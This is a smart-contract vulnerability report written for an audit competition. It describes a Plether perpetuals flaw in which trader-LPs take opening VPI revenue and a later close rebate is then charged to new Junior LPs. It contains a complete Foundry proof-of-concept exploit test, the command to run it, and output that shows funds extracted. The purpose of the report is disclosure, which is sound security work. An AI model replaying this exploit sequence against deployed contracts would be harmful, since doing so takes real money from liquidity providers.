# \#98132 [SC-Critical] Immediate recognition of reversible VPI revenue lets a trader-LP extract new Junior LP funds

**Submitted on Nov 5th 2026 at 10:17:26 UTC by @Pig46940 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98132
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Plether recognizes positive virtual price impact (VPI) from an opening trade as Pool revenue eligible for LP redemption, although the same open position can later receive a negative VPI rebate. A trader who also owns Junior LP shares can withdraw against the opening charge before closing the position. A new Junior LP then enters at a share price that does not reflect that still-open rebate exposure; the later close pays the trader from Pool cash borne by the new cohort. This lets a coordinated trader-LP extract funded USDG from later LPs even when the basket mark and VPI depth do not change.

## Vulnerability Details

The vulnerability crosses two ownership boundaries: **a trader's open position keeps its ability to receive a VPI rebate, while the LP shares that receive its opening VPI charge can be redeemed and replaced by new owners**. No market-price change is required for that mismatch.

VPI first measures the Pool-wide directional imbalance, `S = abs(LONG open-interest notional - SHORT open-interest notional)`, using the execution mark. Economic depth is `D = max(Pool assets - existing trader claims, 0)`, and `k` is the VPI factor. The approximate cost is `C(S) = k * S^2 / (2D)`. [`CfdMath.sol`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdMath.sol#L129-L139) implements the squared-skew cost:

```solidity
uint256 sqSkewOverDepthWad = (skewWad * skewWad) / depthWad;
uint256 costWad = (vpiFactorWad * sqSkewOverDepthWad) / WAD / 2;
```

[`tryCalculateVPI`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdMath.sol#L164-L179) then subtracts the pre-trade cost from the post-trade cost:

```solidity
return (true, int256(postCost) - int256(preCost));
```

An opening trade that increases `S` therefore pays positive VPI. A later close that reduces `S` can produce negative VPI, even at the same execution mark and depth. The integer implementation rounds the cost; the ownership issue does not depend on a rounding difference.

**First boundary — opening revenue becomes redeemable LP value.** Within the positive trade-cost branch, the opening settlement subtracts the protocol fee and records a positive remaining cash inflow as claimant revenue:

```solidity
uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
if (poolCashInflowAssets > 0) {
    IHousePool(host.pool())
        .recordClaimantInflow(
            poolCashInflowAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
}
```

`HousePool` includes that cash in the claimant waterfall. At a settled LP epoch, the existing Junior LP can fund its redemption from Pool USDG; `TrancheVault.claimRedeem` then transfers the funded amount to that LP's wallet. The trader's position stays open after the LP's shares are burned. A later Junior deposit activates at the current tranche price without deducting the possible future VPI rebate attached to that open position. Thus the opening charge can be realized by the departing cohort before the rebate becomes payable.

**Second boundary — the rebate is charged to the Pool's current owners.** On close, [`CloseAccountingLib.sol`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L117) caps the negative VPI against the *trader position's lifetime accrual*:

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The cap does not ask whether the LPs who received the positive opening charge still own shares. A fixed-depth return to the opening skew can leave lifetime VPI at zero, so this clamp does not prevent the cohort transfer. [`CfdEnginePlanLib.sol`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L970-L978) limits the **net action rebate after charges** by free Pool cash:

```solidity
delta.actionRebatePaidAssets =
    delta.actionRebateAssets < freePoolCashAssets ? delta.actionRebateAssets : freePoolCashAssets;
```

When cash is available, the settlement sidecar transfers it from `HousePool` to `MarginClearinghouse` and credits the trader. The free-cash limit protects existing claims but, like the lifetime clamp, does not connect the later Pool debit to the LP cohort credited at opening. A trader controlling the departing Junior shares can retain a portion of the opening revenue while exercising the rebate after replacement capital enters. That is the first-cause ownership mismatch; ERC-20 conservation can hold throughout.

The public AI-scan finding “Temporary pool-liquidity reduction can amplify a skew-reducing close rebate” relies on **reducing close-time depth** so the smaller denominator enlarges the negative VPI. This report concerns immediate opening-revenue realization and later LP cohort incidence. The cohort transfer can occur at **equal opening and closing VPI depth**, so eliminating reduced-depth amplification alone would not eliminate this mechanism.

## Impact Details

**Proposed in-scope impact: Critical — Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.** The attacker realizes a share of the opening VPI through its funded Junior redemption, exits those shares, and retains the trader's right to exercise a later negative-VPI rebate. The close path transfers real Pool USDG to Clearinghouse and credits the attacker's withdrawable trader balance:

```solidity
IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
```

The new Junior LP owns Pool shares when this debit occurs, although it did not own shares when the corresponding positive charge was collected. Its redemption is funded from the reduced Pool assets. The realized extraction is the attacker's LP redemption plus trader withdrawal less its LP/trader funding; the new LP's realized loss is its funded deposit less its wallet redemption. These amounts need not equal because other LPs, fees and residual Pool cash also receive value. The exposure scales with the refundable VPI charge, each cohort's share ownership and action charges. It does not require a market-price move or a reduced close-time VPI denominator.

## References

- [Whitepaper VPI definition, `WHITEPAPER.md:818-865`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L818-L865)
- [Opening revenue writer, `CfdEngineSettlementSidecar.sol:454-463`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L463)
- [VPI potential and signed charge/rebate, `CfdMath.sol:129-179`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdMath.sol#L129-L179)
- [Pool claimant inflow, `HousePool.sol:624-650`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L624-L650)
- [LP redemption selection, `HousePool.sol:824-887`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L824-L887), [Pool-to-Vault funding, `HousePool.sol:992-1010`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L992-L1010), and [Vault wallet transfer, `TrancheVault.sol:1195-1212`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1195-L1212)
- [LP deposit activation, `HousePool.sol:1030-1082`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1030-L1082)
- [Close VPI lifetime clamp, `CloseAccountingLib.sol:103-117`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L117), [rebate affordability, `CfdEnginePlanLib.sol:970-978`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L970-L978), and [Pool-to-trader payment, `CfdEngineSettlementSidecar.sol:621-624`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624)
- [Public AI-scan comparator, stated reduced-depth first cause](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L1742-L1808)


## Proof of Concept

## Proof of Concept

Save the Solidity block below as `packages/perps/test/perps/VpiCrossCohortPoC.t.sol`.
 
The one test creates an existing Junior LP, the attacker as a second Junior LP and trader, a Senior LP, and a separate new Junior LP. It opens a position while the attacker owns Junior shares, funds and claims that LP's redemption, activates the new LP's deposit, then closes the still-open trader position. The deposit restores **both physical Pool cash and VPI pricing depth** to their opening values before the close. Finally, the attacker withdraws trader margin and the new LP claims its funded redemption. The assertions check actual wallet balances, a paid rebate, the completed position and claims, and conservation of every minted USDG atom.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {OracleSynchronizationTestBase} from "./shared/OracleSynchronizationTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {Vm} from "forge-std/Vm.sol";

/// @notice One end-to-end fixed-depth VPI cohort extraction with actual LP cash claims.
contract VpiCrossCohortPoCTest is OracleSynchronizationTestBase {

    address private constant ATTACKER_LIQUIDITY_PROVIDER = address(0xA110);
    address private constant EXISTING_JUNIOR_LP = address(0xB110);
    address private constant SENIOR_LIQUIDITY_PROVIDER = address(0xC110);
    address private constant NEW_JUNIOR_LP = address(0xD110);
    address private constant ATTACKER_TRADING_ACCOUNT = address(0xA111);

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function test_AttackerCapturesVpiAcrossJuniorLpCohorts() public {
        IHousePool.PoolConfig memory launchConfig = _currentPoolConfig();
        launchConfig.maxSeniorExposureAssets = 40_000_000e6;
        launchConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(launchConfig);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        vm.warp(SETUP_TIMESTAMP + 7 days);

        _depositAndActivateLiquidity(juniorVault, EXISTING_JUNIOR_LP, 35_000_000e6);
        _depositAndActivateLiquidity(juniorVault, ATTACKER_LIQUIDITY_PROVIDER, 55_000_000e6);
        _depositAndActivateLiquidity(seniorVault, SENIOR_LIQUIDITY_PROVIDER, 10_000_000e6);
        _fundTrader(ATTACKER_TRADING_ACCOUNT, 5_000_000e6);

        uint256 attackerShares = juniorVault.balanceOf(ATTACKER_LIQUIDITY_PROVIDER);
        vm.warp(juniorVault.lastDepositTime(ATTACKER_LIQUIDITY_PROVIDER) + juniorVault.DEPOSIT_COOLDOWN());
        vm.prank(ATTACKER_LIQUIDITY_PROVIDER);
        uint256 attackerRedeemId =
            juniorVault.requestRedeem(attackerShares, ATTACKER_LIQUIDITY_PROVIDER, ATTACKER_LIQUIDITY_PROVIDER);
        vm.warp(juniorVault.depositEpochStart(attackerRedeemId));

        uint256 poolBeforeOpen = settlementToken.balanceOf(address(pool));
        uint256 depthBeforeOpen = pool.totalAssets();
        // The attacker opens while it owns Junior shares. Positive VPI enters Pool revenue.
        vm.prank(ATTACKER_TRADING_ACCOUNT);
        router.commitOrder(CfdTypes.Side.LONG, 40_000_000e18, 1_000_000e6, 0, false);
        _advance(uint64(vm.getBlockTimestamp() + 1));
        router.executeOrder{value: 2 * FEE}(
            1, _payload(uint64(vm.getBlockTimestamp()), uint64(vm.getBlockTimestamp() - 1))
        );
        (,,,,,, int256 openingVpiCharge) = engine.positions(ATTACKER_TRADING_ACCOUNT);
        assertGt(openingVpiCharge, 0, "Opening trade must pay VPI");
        uint256 poolAfterOpen = settlementToken.balanceOf(address(pool));

        _advance(uint64(vm.getBlockTimestamp() + 1));
        router.settleLpEpoch{value: 2 * FEE}(
            _payload(uint64(vm.getBlockTimestamp()), uint64(vm.getBlockTimestamp() - 1))
        );
        uint256 attackerClaimableShares =
            juniorVault.claimableRedeemRequest(attackerRedeemId, ATTACKER_LIQUIDITY_PROVIDER);
        assertEq(attackerClaimableShares, attackerShares, "Attacker LP exit must be fully funded");
        vm.prank(ATTACKER_LIQUIDITY_PROVIDER);
        uint256 attackerLpPayout = juniorVault.claimRedeem(
            attackerRedeemId, attackerClaimableShares, ATTACKER_LIQUIDITY_PROVIDER, ATTACKER_LIQUIDITY_PROVIDER
        );
        uint256 poolAfterAttackerExit = settlementToken.balanceOf(address(pool));

        // A separate Junior LP restores the Pool's pre-open depth before the close.
        uint256 newJuniorDepositAssets = poolBeforeOpen - poolAfterAttackerExit;
        _depositAndActivateLiquidity(juniorVault, NEW_JUNIOR_LP, newJuniorDepositAssets);
        uint256 poolBeforeClose = settlementToken.balanceOf(address(pool));
        uint256 depthBeforeClose = pool.totalAssets();
        assertEq(poolBeforeClose, poolBeforeOpen, "Physical Pool depth should be restored");
        assertEq(depthBeforeClose, depthBeforeOpen, "VPI pricing depth should be restored");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "No claim may reduce close VPI depth");

        // The trader closes after its LP shares are gone. Record the actual paid rebate event.
        vm.prank(ATTACKER_TRADING_ACCOUNT);
        router.commitOrder(CfdTypes.Side.LONG, 40_000_000e18, 0, 0, true);
        _advance(uint64(vm.getBlockTimestamp() + 1));
        vm.recordLogs();
        router.executeOrder{value: 2 * FEE}(
            2, _payload(uint64(vm.getBlockTimestamp()), uint64(vm.getBlockTimestamp() - 1))
        );
        uint256 rebatePaidToTrader = _paidActionRebateFromLogs(vm.getRecordedLogs());
        assertGt(rebatePaidToTrader, 0, "Close must pay an actual Pool-funded rebate");
        uint256 poolAfterClose = settlementToken.balanceOf(address(pool));

        uint256 traderWithdrawable = clearinghouse.balanceAssets(ATTACKER_TRADING_ACCOUNT);
        vm.prank(ATTACKER_TRADING_ACCOUNT);
        clearinghouse.withdrawMargin(traderWithdrawable);
        uint256 attackerWalletAssets = settlementToken.balanceOf(ATTACKER_LIQUIDITY_PROVIDER)
            + settlementToken.balanceOf(ATTACKER_TRADING_ACCOUNT);
        uint256 newJuniorShares = juniorVault.balanceOf(NEW_JUNIOR_LP);

        vm.warp(juniorVault.lastDepositTime(NEW_JUNIOR_LP) + juniorVault.DEPOSIT_COOLDOWN());
        uint256 seniorShares = seniorVault.balanceOf(SENIOR_LIQUIDITY_PROVIDER);
        vm.prank(SENIOR_LIQUIDITY_PROVIDER);
        uint256 seniorRedeemId =
            seniorVault.requestRedeem(seniorShares, SENIOR_LIQUIDITY_PROVIDER, SENIOR_LIQUIDITY_PROVIDER);
        vm.prank(NEW_JUNIOR_LP);
        uint256 newJuniorRedeemId = juniorVault.requestRedeem(newJuniorShares, NEW_JUNIOR_LP, NEW_JUNIOR_LP);
        assertEq(seniorRedeemId, newJuniorRedeemId, "Senior and Junior exits should share one epoch");
        vm.warp(juniorVault.depositEpochStart(newJuniorRedeemId));
        _advance(uint64(vm.getBlockTimestamp()));
        router.settleLpEpoch{value: 2 * FEE}(
            _payload(uint64(vm.getBlockTimestamp()), uint64(vm.getBlockTimestamp() - 1))
        );
        uint256 seniorClaimableShares = seniorVault.claimableRedeemRequest(seniorRedeemId, SENIOR_LIQUIDITY_PROVIDER);
        assertEq(seniorClaimableShares, seniorShares, "Senior exit must clear the ratio constraint");
        uint256 newJuniorClaimableShares = juniorVault.claimableRedeemRequest(newJuniorRedeemId, NEW_JUNIOR_LP);
        assertEq(newJuniorClaimableShares, newJuniorShares, "Fresh LP exit must be fully funded");
        vm.prank(NEW_JUNIOR_LP);
        uint256 newJuniorPayout =
            juniorVault.claimRedeem(newJuniorRedeemId, newJuniorClaimableShares, NEW_JUNIOR_LP, NEW_JUNIOR_LP);
        uint256 newJuniorWalletAssets = settlementToken.balanceOf(NEW_JUNIOR_LP);
        assertEq(newJuniorWalletAssets, newJuniorPayout, "Fresh LP must receive physical USDG");

        emit log_named_uint("Pool cash before open", poolBeforeOpen);
        emit log_named_uint("Economic depth before open", depthBeforeOpen);
        emit log_named_uint("Economic depth before close", depthBeforeClose);
        emit log_named_uint("Pool cash after open", poolAfterOpen);
        emit log_named_int("Opening VPI charge", openingVpiCharge);
        emit log_named_uint("Actual close action rebate paid to trader", rebatePaidToTrader);
        emit log_named_uint("Pool cash after attacker LP exit", poolAfterAttackerExit);
        emit log_named_uint("Pool cash after close", poolAfterClose);
        emit log_named_uint("Attacker LP payout", attackerLpPayout);
        emit log_named_uint("Attacker total wallet cash", attackerWalletAssets);
        emit log_named_uint("Attacker initial funding", 60_000_000e6);
        emit log_named_uint("New Junior LP deposit", newJuniorDepositAssets);
        emit log_named_uint("New Junior LP actual payout", newJuniorPayout);
        emit log_named_uint("New Junior LP wallet USDG", newJuniorWalletAssets);
        emit log_named_uint("Pool final physical USDG", settlementToken.balanceOf(address(pool)));
        emit log_named_uint("Pool final accounted USDG", pool.accountedAssets());
        emit log_named_uint("Clearinghouse final physical USDG", settlementToken.balanceOf(address(clearinghouse)));
        emit log_named_uint("Senior Vault final USDG", settlementToken.balanceOf(address(seniorVault)));
        emit log_named_uint("Junior Vault final USDG", settlementToken.balanceOf(address(juniorVault)));
        emit log_named_uint("Trader claims remaining", engine.totalTraderClaimBalanceAssets());
        emit log_named_uint("Treasury cash credit", clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT));
        emit log_named_uint("Keeper cash credit", clearinghouse.balanceAssets(address(this)));
        emit log_named_uint("Fixture Alice cash credit", clearinghouse.balanceAssets(ALICE));
        emit log_named_uint("Fixture Bob cash credit", clearinghouse.balanceAssets(BOB));

        assertEq(juniorVault.balanceOf(ATTACKER_LIQUIDITY_PROVIDER), 0, "Attacker LP shares must be gone");
        assertEq(juniorVault.balanceOf(NEW_JUNIOR_LP), 0, "Fresh LP must redeem all shares");
        assertEq(clearinghouse.balanceAssets(ATTACKER_TRADING_ACCOUNT), 0, "Trader margin must be withdrawn");
        (uint256 remainingSize,,,,,,) = engine.positions(ATTACKER_TRADING_ACCOUNT);
        assertEq(remainingSize, 0, "Trader position must be closed");

        assertGt(attackerWalletAssets, 60_000_000e6, "Combined attacker must take net USDG");
        assertLt(newJuniorPayout, newJuniorDepositAssets, "New independent LP must lose actual USDG");
        assertEq(settlementToken.balanceOf(address(pool)), pool.accountedAssets(), "Pool cash must be real");
        assertEq(settlementToken.balanceOf(address(juniorVault)), 0, "Junior claims must be paid");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "No trader claim may remain");

        // Independent token conservation: deposits and fixture seed equal final wallet and custody cash.
        uint256 initialTotalCash =
            35_000_000e6 + 55_000_000e6 + 10_000_000e6 + 5_000_000e6 + newJuniorDepositAssets + 2000e6 + 20_000e6;
        uint256 finalTotalCash = attackerWalletAssets + newJuniorWalletAssets + settlementToken.balanceOf(address(pool))
            + settlementToken.balanceOf(address(clearinghouse)) + settlementToken.balanceOf(address(seniorVault))
            + settlementToken.balanceOf(address(juniorVault));
        assertEq(finalTotalCash, initialTotalCash, "Every USDG atom must reconcile");
    }

    function _depositAndActivateLiquidity(
        TrancheVault vault,
        address liquidityProvider,
        uint256 assets
    ) private {
        settlementToken.mint(liquidityProvider, assets);
        vm.startPrank(liquidityProvider);
        settlementToken.approve(address(vault), assets);
        uint256 depositId = vault.requestDeposit(assets, liquidityProvider, liquidityProvider);
        vm.stopPrank();

        _advance(uint64(vault.depositEpochStart(depositId)));
        router.settleLpEpoch{value: 2 * FEE}(
            _payload(uint64(vm.getBlockTimestamp()), uint64(vm.getBlockTimestamp() - 1))
        );
        uint256 claimableAssets = vault.claimableDepositRequest(depositId, liquidityProvider);
        assertEq(claimableAssets, assets, "LP deposit must actually activate");
        vm.prank(liquidityProvider);
        vault.claimDeposit(depositId, claimableAssets, liquidityProvider, liquidityProvider);
    }

    function _paidActionRebateFromLogs(
        Vm.Log[] memory executionLogs
    ) private view returns (uint256) {
        bytes32 rebateEventSignature = keccak256("ActionRebateSettled(address,uint256,uint256,uint256)");
        bytes32 traderTopic = bytes32(uint256(uint160(ATTACKER_TRADING_ACCOUNT)));
        for (uint256 index = 0; index < executionLogs.length; ++index) {
            Vm.Log memory executionLog = executionLogs[index];
            if (
                executionLog.emitter != address(engine.settlementSidecar()) || executionLog.topics.length != 2
                    || executionLog.topics[0] != rebateEventSignature || executionLog.topics[1] != traderTopic
            ) {
                continue;
            }
            (uint256 assessedRebate, uint256 paidRebate, uint256 waivedRebate) =
                abi.decode(executionLog.data, (uint256, uint256, uint256));
            assertEq(assessedRebate, paidRebate + waivedRebate, "Rebate event must reconcile");
            return paidRebate;
        }
        revert("Missing committed ActionRebateSettled event");
    }

}
```

From the repository's `packages/perps` directory, run the single selected test:

```bash
forge test -j 2 --match-path test/perps/VpiCrossCohortPoC.t.sol --match-test test_AttackerCapturesVpiAcrossJuniorLpCohorts -vv
```

The decisive log values are in **raw 6-decimal USDG atoms** (`1,000,000` atoms = `1 USDG`):

```text
Opening VPI charge:                         79966403871
Actual close action rebate paid to trader:  63963203871
Economic depth before open:                  100002000000000
Economic depth before close:                 100002000000000
Attacker total wallet cash:                  60005506604819
Attacker initial funding:                    60000000000000
New Junior LP deposit:                       54973734395769
New Junior LP actual payout:                 54939561257135
Trader claims remaining:                     0
```

The paid action rebate is the **net amount actually settled after action charges**, not the gross signed VPI delta. With equal opening and closing depth, the attacker finishes **5,506.604819 USDG above** its 60,000,000.000000 USDG combined funding. The independent new Junior LP receives **34,173.138634 USDG less** than its 54,973,734.395769 USDG deposit. The code also asserts that the trader position and claim are gone, the Pool's physical and accounted cash agree, and the sum of wallet and custody balances equals the total minted USDG exactly. The test's final checkpoint leaves the Senior redemption funded in its Vault; that cash is included in the conservation assertion.
The fixture's six Pyth components and USDG balances are synthetic local inputs, not historical signed feeds or a claim about deployed liquidity. 
